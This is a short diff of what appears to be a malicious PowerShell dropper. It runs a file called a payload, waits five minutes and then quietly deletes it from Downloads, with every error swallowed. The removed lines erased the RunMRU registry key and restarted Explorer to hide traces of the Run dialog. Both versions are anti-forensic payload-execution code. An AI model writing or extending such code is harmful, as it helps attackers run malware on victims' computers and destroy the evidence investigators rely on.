@@ -22,11 +22,7 @@ try {
     
     Start-Process -FilePath $payloadPath
     
-    # Nuke RunMRU and restart Explorer to clear it
-    Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
-    Stop-Process -Name explorer -Force
-    Start-Process explorer
-    
+    # Wait 5 minutes then delete from Downloads
     Start-Sleep -Seconds 300
     Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
 } catch {}
